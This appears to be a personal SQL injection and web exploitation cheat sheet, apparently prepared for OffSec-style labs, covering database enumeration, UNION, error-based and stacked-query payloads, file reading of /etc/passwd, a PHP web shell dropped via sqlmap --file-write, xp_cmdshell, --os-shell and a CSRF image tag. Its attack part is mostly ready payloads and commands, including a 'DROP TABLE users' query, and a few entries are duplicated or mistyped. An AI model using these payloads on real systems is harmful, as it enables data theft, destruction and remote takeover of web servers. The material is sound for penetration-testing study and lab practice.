# 🧠 SQL Injection and Web Exploitation Master Guide — OffSec-Ready Edition

---

## 📘 Introduction to SQL

SQL (Structured Query Language) is the language used to communicate with relational databases. It allows you to query, insert, update, and delete data in databases such as MySQL, PostgreSQL, MSSQL, and Oracle.

---

## 🔍 SQL Overview

- **Data Manipulation Language (DML)**: `SELECT`, `INSERT`, `UPDATE`, `DELETE`
- **Data Definition Language (DDL)**: `CREATE`, `ALTER`, `DROP`
- **Data Control Language (DCL)**: `GRANT`, `REVOKE`
- **Transactional Control**: `BEGIN`, `COMMIT`, `ROLLBACK`

---

## 🧾 Basic SQL Syntax

```sql
SELECT column1, column2 FROM table_name WHERE condition;
INSERT INTO table_name (col1, col2) VALUES ('val1', 'val2');
UPDATE table_name SET col1='value' WHERE col2='condition';
DELETE FROM table_name WHERE condition;
```

---

## 🔍 Manual Database Enumeration

### Common MySQL Recon

```sql
select version();
```

```sql
select current_user();
```

```sql
select table_schema from information_schema.tables group by table_schema;
```

```sql
select table_name from information_schema.tables where table_schema = 'app';
```

```sql
select column_name, data_type from information_schema.columns where table_schema = 'app' and table_name = 'menu';
```

### SQL Microsoft SQL Server Recon

```sql
select @@version;
```

```sql
SELECT SYSTEM_USER;
```

```sql
SELECT name FROM sysobjects WHERE type='U';
```

```sql
SELECT name FROM sys.databases;
```

```sql
select * from app.information_schema.tables;
```

```sql
select COLUMN_NAME, DATA_TYPE from app.information_schema.columns where TABLE_NAME = 'menu';
```

### PostgreSQL Recon

```sql
select version();
```

```sql
select current_user;
```

```sql
select datname from pg_database;
```

```sql
SELECT * FROM pg_tables;
```

```sql
select table_name from app.information_schema.tables where table_schema = 'public';
```

```sql
select column_name, data_type from app.information_schema.columns where table_name = 'menu';
```

### Oracle Recon

```sql
select * from v$version;
```

```sql
select user from dual;
```

```sql
select owner from all_tables group by owner;
```

```sql
select table_name from all_tables where owner = 'SYS' order by table_name;
```

```sql
select column_name, data_type from all_tab_columns where table_name = 'MENU';
```

---

## 🌐 Cross-Origin Attacks

Cross-origin attacks abuse trust between different origins (domain, protocol, port). These include CSRF, XSS, and more.

---

## 🔐 Same-Origin Policy (SOP)

SOP restricts how documents or scripts loaded from one origin can interact with resources from another. Prevents malicious scripts from reading sensitive data.

---

## 🍪 SameSite Cookies

SameSite is a cookie attribute that controls whether a cookie is sent with cross-site requests. Options:

- `Strict`: Only sent in same-site context
- `Lax`: Sent on top-level navigation
- `None`: Sent always (requires `Secure`)

---

## 🎯 Cross-Site Request Forgery (CSRF)

Forces a logged-in user to execute unwanted actions.

### 🔍 Detecting and Preventing CSRF

- **Detecting**: Absence of CSRF token, reliance on cookies
- **Preventing**: Use CSRF tokens, double-submit cookies, same-site cookies

### 💥 Exploiting CSRF

```html
<img src="http://target.com/delete_account?id=1" />
```

---

## 🧪 Testing for SQL Injection

Try payloads in input fields, headers, and parameters.

### Basic Test Payloads

```sql
' OR 1=1 --
' AND 1=2 --
' UNION SELECT NULL, NULL --
```

---

## 📌 Closing Out Strings and Functions

Used to break out of SQL context:

- `'` for string closure
- `)--` to comment out
- `;` to stack queries

---

## 📊 Sorting

Used to determine column count or inject order clause:

```sql
ORDER BY 1 --
ORDER BY 5 --
```

---

## 🚧 Boundary Testing

Testing numeric, string, and buffer boundaries:

```sql
?id=0 -- Check for NULL bypass
?name='aaaaa...aaaa' -- Long input string
```

---

## 🧨 Fuzzing

Send randomized or malformed inputs:

- Use tools: Burp Intruder, ffuf, sqlmap
- Look for error messages, time delays

---

## 💥 Exploiting SQL Injection

Types:

- **Boolean-based**: `' AND 1=1 --`
- **Time-based**: `' AND SLEEP(5) --`
- **Error-based**: `extractvalue('',concat('>',version()))`
- **Union-based**: `' UNION SELECT NULL, username, password FROM users --`
- **Stacked**: `'; DROP TABLE users; --` (if allowed)

---

### Error Base SQL Injection (SQL SERVER)

Errorbase
MySQL

```sql
extractvalue('',concat('>',version()))
```

SQL Server

```sql
cast(@@version as integer)
```

```sql
cast((SELECT name FROM sys.databases
WHERE database_id = 1;) as int)
```

```sql
cast((SELECT TOP 1 flag FROM App.dbo.flags;) as int);
```

```sql
CAST((SELECT name
FROM app.sys.tables
ORDER BY name
OFFSET 2 ROWS FETCH NEXT 1 ROWS ONLY) AS INT);
```

Tips:

    - Keep incrementing the OFFSET to walk through the table names.

    - Use a script if possible to automate it.

     -Make note of each table name from the error message.

```sql
CAST((SELECT name FROM app.sys.tables ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY) AS INT)
```

```sql
CAST((
  SELECT name
  FROM app.sys.columns
  WHERE object_id = OBJECT_ID('app.dbo.flags')
  ORDER BY name
  OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY
) AS INT)
```

```sql
CAST((SELECT name FROM target.sys.tables WHERE name LIKE '%flag%';) as int)
```

```sql
CAST((
  SELECT name
  FROM target.sys.columns
  WHERE object_id = OBJECT_ID('target.dbo.flags')
  ORDER BY name
  OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY
) AS INT)
```

```sql
CAST((
  SELECT TOP 1 flag
  FROM target.dbo.flags
) AS INT)
```

PostgreSQL

```sql
cast(version() as integer)
```

Oracle

```sql
to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))
```

### UNION-Based & Database Detection Notes

#### Purpose

To detect and exploit UNION-based SQL Injection vulnerabilities and identify the backend database (MySQL, SQL Server, Oracle, PostgreSQL).

---

```sql
' order by 1--
```

#### or for burp

Always URL encode your payload if you paste it into Burp:

    - ' → %27

    - Space → %20

    - -- - → %2D%2D%20-

```sql
%25%27+order+by+4+--
```

---

## 🔀 UNION-based Payloads

```sql
' union select 111, 222, 333, 444---
```

```sql
a' union select 111, username, password, 444 from usser--
```

```sql
' UNION SELECT NUll, table_name, NULL FROM information_schema.tables--
```

Get current DB user (check for admin permissions)

```sql
')) UNION SELECT 1, user(), '', 1 -- -
```

Enumerate databases

```sql
')) UNION SELECT 1, schema_name, '', 1 FROM information_schema.schemata -- -
```

Enumerate tables inside a target DB

```sql
')) UNION SELECT 1, table_name, '', 1 FROM information_schema.tables WHERE table_schema='target_db' -- -
```

List All Columns in a Table

```sql
')) UNION SELECT 1, column_name, '', 1 FROM information_schema.columns WHERE table_name='target_table' -- -
```

Enumerate columns in a specific table

```sql
')) UNION SELECT 1, column_name, '', 1 FROM information_schema.columns WHERE table_name='target_table' -- -
```

```sql
')) UNION ALL SELECT 1, column_name, "", 1 FROM information_schema.columns WHERE table_name='targetTable' -- -
```

```sql
')) UNION SELECT 1, column_name, '', 1 FROM information_schema.columns WHERE table_name='targetTable' AND column_name='flag' -- -
```

```sql
')) UNION SELECT 1, CONCAT(table_name, '.', column_name), '', 1 FROM information_schema.columns WHERE table_schema='target' -- -
```

```sql
')) UNION ALL SELECT 1, flag, '', 1 FROM app.targetTable -- -
```

Used to append another SELECT and leak data:

```sql
' UNION SELECT 1, username, password FROM users --
```

Use `ORDER BY` to find number of columns.

---

## 🧱 Stacked Queries

How Stacked Queries Work

Normally, SQL queries sent to a database are supposed to be single, complete commands.
But if an application is vulnerable and does not properly sanitize input, an attacker might inject something like:

- ; separates two queries.

- The first query runs and returns something.

- Then the second query executes and deletes the users table.

Execute multiple queries in one request (supported in PostgreSQL, MSSQL):

```sql
'; SELECT user(); DROP TABLE users; --
```

---

## Optional

if allowed

```shell
sqlmap -u "http://example.com/page.php?id=1" --level=5 --risk=3 --batch --dbs
```

It can test all types: error-based, boolean-based, time-based — and auto-detect the backend.

show all tables

```sql
target';select * from pg_tables-- -
```

PostgreSQL stores all table metadata in the pg_tables system view.

```sql
target; SELECT tablename FROM pg_tables WHERE schemaname='public'; --
```

Once you've identified a suspicious table (e.g., table), inspect its columns with:

```sql
target; SELECT column_name FROM information_schema.columns WHERE table_name='table'; --
```

Now that you know the table and the column, extract the data with a final stacked query:

```sql
target; SELECT flag FROM flag_table; --
```

```sql
target; SELECT flag FROM flag_table; --
```

---

## 📥 Reading and Writing Files

### MySQL

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT * INTO OUTFILE '/tmp/data.txt' FROM users;
```

### PostgreSQL

```sql
SELECT pg_read_file('postgresql.conf', 0, 1000);
```

### Reading and Writing Files

```sql
create table tmp(data text);
copy tmp from '/etc/passwd';
select * from tmp;
```

The pg_read_file() function reads files on the server filesystem (not client-side) and has the following valid forms:

```sql
pg_read_file(filename text [, offset integer, length integer [, missing_ok boolean]])
```

- filename: path relative to the data directory (you can't read arbitrary files).
- offset (optional): start position in bytes.
- length (optional): number of bytes to read.
- missing_ok (optional, PostgreSQL 13+): if true, returns NULL instead of error if file doesn't exist.

```sql
SELECT pg_read_file('postgresql.conf');  -- read full file
SELECT pg_read_file('postgresql.conf', 0, 1000);  -- first 1000 bytes
SELECT pg_read_file('postgresql.conf', 0, 1000, true);  -- ignore if missing
```

Only superusers can use pg_read_file(). If you run this as a normal user, you'll get a permission denied error.

In MySQL, we can read files using the LOAD_FILE() function. However, there is a catch. MySQL has a secure_file_priv system variable that restricts which directories can be used to read or write files. Some versions of MySQL do not set this variable by default, which means MySQL can potentially read or write any file (subject to OS file permissions). Setting the value to an empty string ("") is the same as leaving the value blank. Other versions, or hardened configurations, will set this variable to a specific directory. We can check the value of this variable with

```sql
SELECT @@GLOBAL.secure_file_priv;
```

```sql
SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt'
```

```sql
SELECT LOAD_FILE('/var/lib/mysql-files/test.txt')
```

### Remote code execution

Here’s an example command to perform Error-based SQL Injection using SQLmap:

```shell
sqlmap -u "http://example.com/vulnerable.php?id=1" --technique E --dump
```

This command specifies the target URL and injection point using the -u option, the Error-based SQL Injection technique using the --technique option, and the --dump option to extract data from the database.

```shell
sqlmap -u "http://example/index.php?id=8" --tables --batch
```

```shell
sqlmap -u "http://example/index.php?id=8" -D extramile -T flags --columns --batch
```

```shell
sqlmap -u "http://example/page.php?id=8" --privileges --current-user
```

#### shell.php

```shell
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
```

    - http://target.com/shell.php?cmd=whoami

```shell
sqlmap -u "http://target.com/page.php?id=1" \
--file-write="shell.php" \
--file-dest="/var/www/html/shell.php" \
--batch
```

```shell
cp /root/flag.txt /var/www/html/
```

```shell
sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mysql&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=mysql --dump --flush-session
```

```shell
sqlmap -r burp_sqlmap-test.txt --dbms=PostgreSQL --flush-session --batch --dump
```

```shell
sqlmap -r burp_sqlmap-server.txt --dbms="Microsoft SQL Server" --flush-session --batch --dump
```

```shell
sqlmap -r burp_sqlmap-oracle.txt --dbms=Oracle --flush-session --batch --dump
```

```shell
sqlmap -r burp_sql-server.txt \
  --dbms="Microsoft SQL Server" \
  --batch \
  --search -C flag
```

---

#### Find the value of the X-Powered-By header

```shell
curl -I http://target-site.com
```

---

## 💻 Remote Code Execution

### SQL Server

```sql
EXEC xp_cmdshell('whoami');
```

### MySQL (via file drop)

```php
echo "<?php system($_GET['cmd']); ?>" > shell.php
```

Upload using SQLMap:

```bash
sqlmap -u URL --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

---

## 📦 Database Dumping with Automated Tools

### sqlmap Core Commands

```bash
sqlmap -u "http://target/page.php?id=1" --dbs --batch
sqlmap -u "http://target/page.php?id=1" -D dbname --tables
sqlmap -u "http://target/page.php?id=1" -D dbname -T users --dump
sqlmap --os-shell  # For RCE if found
```

### POST Example

```bash
sqlmap -u "http://target.com/login" --data="user=admin&pass=1" --dbs
```

---

### SQLMAP

```shell
sqlmap -u "http://sql-injection/exploit/stacked" --technique=S --dbms=PostgreSQL --risk=3 --level=5 --batch
```

#### Breakdown of the Options

## Option Purpose

- -u Target URL
- ?id=rug The vulnerable parameter id with test input rug
- --technique=S Only use Stacked queries (S)
- --dbms=PostgreSQL Assume backend is PostgreSQL (helps optimize payloads)
- --risk=3 --level=5 Enables more aggressive payloads and parameter coverage
- --batch Auto-confirms prompts for non-interactive use
- --time-sec=5 → helps detect time-based blind SQLi (e.g., via pg_sleep)
- --flush-session → forces sqlmap to retry scanning from scratch
- --data="username=rug" Sends this as the POST body
- -r: tells sqlmap to read a raw HTTP request file

By default, sqlmap tests all parameters (name, sort, order). If only one is vulnerable, you can narrow it down:

- -p name

Some apps reject POST without Content-Type: application/x-www-form-urlencoded. Add it like so:

- --headers="Content-Type: application/x-www-form-urlencoded"

Once sqlmap confirms a vulnerability, you can use:

```shell
sqlmap -u "http://target.url/?id=rug" --sql-shell
```

This gives you a live SQL shell — anything you type will be executed directly on the database. For example:

Read files from disk:

- --file-read=/etc/passwd

Write files (webshells, payloads):

- --file-write=backdoor.php --file-dest=/var/www/html/shell.php

Execute OS commands:

- --os-shell

#### Send to sqlmap (optional)

```shell
sqlmap -r burp_request.txt --batch --risk=3 --level=5 --technique=S
```

### URL-Encoded

    - space ()	%20
    - ! 	%21
    - " 	%22
    - # 	%23
    - $ 	%24
    - % 	%25
    - & 	%26
    - ' 	%27
    - ( 	%28
    - ) 	%29
    - * 	%2A
    - + 	%2B
    - , 	%2C
    - - 	%2D
    - . 	%2E
    - ;	  %3B
    - / 	%2F
    - ' (single quote)	%27
    - =	  %3D
    - -- (comment) 	    -- or --+
    - : 	%3A
    - ; 	%3B
    - < 	%3C
    - = 	%3D
    - > 	%3E
    - ? 	%3F
    - @ 	%40
    - [ 	%5B
    - \ 	%5C
    - ] 	%5D
    - ^ 	%5E
    - _ 	%5F
    - ` 	%60
    - { 	%7B
    - | 	%7C
    - } 	%7D
    - ~ 	%7E
    - € %E2%82%AC
    -  %81
    - ‚ %E2%80%9A
    - ƒ %C6%92
    - „ %E2%80%9E
    - … %E2%80%A6
    - † %E2%80%A0
    - ‡ %E2%80%A1
    - ˆ %CB%86
    - ‰ %E2%80%B0
    - Š %C5%A0
    - ‹ %E2%80%B9
    - Œ %C5%92
    -  %C5%8D
    - Ž %C5%BD
    -  %8F
    -  %C2%90
    - ‘ %E2%80%98
    - ’ %E2%80%99
    - “ %E2%80%9C
    - ” %E2%80%9D
    - • %E2%80%A2
    - – %E2%80%93
    - — %E2%80%94
    - ˜ %CB%9C
    - › %E2%80
    - œ %C5%93
    -  %9D
    - ž %C5%BE
    - Ÿ %C5%B8
    - ¡ %C2%A1
    - ¦ %C2%A6
    - § %C2%A7
    - ¨ %C2%A8
    - © %C2%A9
    - « %C2%AB
    - ¬ %C2%AC
    - ´ %C2%B4
    - · %B7 %C2%B7
    - ¸ %C2%B8
    - ¹ %C2%B9
    - º %C2%BA
    - » %C2%BB

---

🏁 **Final Tips**

- Use UNION when possible — faster output.
- Blind/time-based if no errors shown.
- Automate using sqlmap, but understand manual steps.
- Keep payload list handy.
